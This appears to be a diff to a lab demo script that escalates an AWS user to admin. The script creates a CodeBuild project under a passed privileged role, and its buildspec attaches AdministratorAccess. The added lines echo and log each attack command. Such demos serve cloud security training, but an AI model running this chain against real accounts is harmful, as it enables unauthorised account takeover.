@@ -3,7 +3,9 @@
 # Demo script for iam:PassRole + codebuild:CreateProject + codebuild:StartBuild privilege escalation
 # This script demonstrates how a user with CodeBuild permissions can escalate to admin
 
-set -e
+
+# Disable AWS CLI paging
+export AWS_PAGER=""
 
 # Colors for output
 RED='\033[0;31m'
@@ -11,6 +13,24 @@ GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 STARTING_USER="pl-prod-codebuild-001-to-admin-starting-user"
@@ -69,6 +89,7 @@ unset AWS_SESSION_TOKEN
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $CURRENT_USER"
 
@@ -80,6 +101,7 @@ echo -e "${GREEN}✓ Verified starting user identity${NC}\n"
 
 # Step 3: Get account ID
 echo -e "${YELLOW}Step 3: Getting account ID${NC}"
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
@@ -87,6 +109,7 @@ echo -e "${GREEN}✓ Retrieved account ID${NC}\n"
 # Step 4: Verify we don't have admin permissions yet
 echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
 echo "Attempting to list IAM users (should fail)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -121,6 +144,7 @@ TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
 echo "Target Role ARN: $TARGET_ROLE_ARN"
 
 # Create the CodeBuild project with JSON format
+show_attack_cmd "aws codebuild create-project --region $AWS_REGION --name \"$CODEBUILD_PROJECT_NAME\" --source \"{\\\"type\\\":\\\"NO_SOURCE\\\",\\\"buildspec\\\":\\\"version: 0.2\\\\nphases:\\\\n  build:\\\\n    commands:\\\\n      - echo \\\\\\\"Starting privilege escalation...\\\\\\\"\\\\n      - aws iam attach-user-policy --user-name ${STARTING_USER} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\\\\n      - echo \\\\\\\"Successfully attached AdministratorAccess policy!\\\\\\\"\\\"}\" --artifacts type=NO_ARTIFACTS --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL --service-role \"$TARGET_ROLE_ARN\" --output json"
 aws codebuild create-project \
     --region $AWS_REGION \
     --name "$CODEBUILD_PROJECT_NAME" \
@@ -143,6 +167,7 @@ echo ""
 echo -e "${YELLOW}Step 7: Starting CodeBuild build to execute privilege escalation${NC}"
 echo "Starting build for project: $CODEBUILD_PROJECT_NAME"
 
+show_attack_cmd "aws codebuild start-build --region $AWS_REGION --project-name \"$CODEBUILD_PROJECT_NAME\" --output json"
 BUILD_RESULT=$(aws codebuild start-build \
     --region $AWS_REGION \
     --project-name "$CODEBUILD_PROJECT_NAME" \
@@ -168,6 +193,7 @@ echo "This may take 30-60 seconds for the build to run and IAM changes to take e
 WAIT_TIME=0
 MAX_WAIT=120
 while [ $WAIT_TIME -lt $MAX_WAIT ]; do
+    show_cmd "aws codebuild batch-get-builds --region $AWS_REGION --ids \"$BUILD_ID\" --query 'builds[0].buildStatus' --output text"
     BUILD_STATUS=$(aws codebuild batch-get-builds \
         --region $AWS_REGION \
         --ids "$BUILD_ID" \
@@ -204,6 +230,7 @@ echo -e "${GREEN}✓ Policy should be propagated${NC}\n"
 echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
 echo "Attempting to list IAM users..."
 
+show_cmd "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
@@ -232,6 +259,13 @@ echo -e "  $STARTING_USER → (codebuild:CreateProject + iam:PassRole)"
 echo -e "  → CodeBuild project with $TARGET_ROLE"
 echo -e "  → (codebuild:StartBuild) → Buildspec executes with admin permissions"
 echo -e "  → Attach AdministratorAccess to $STARTING_USER → Admin"
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "\n${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+fi
 
 echo -e "\n${YELLOW}Attack Artifacts:${NC}"
 echo "- CodeBuild Project: $CODEBUILD_PROJECT_NAME"
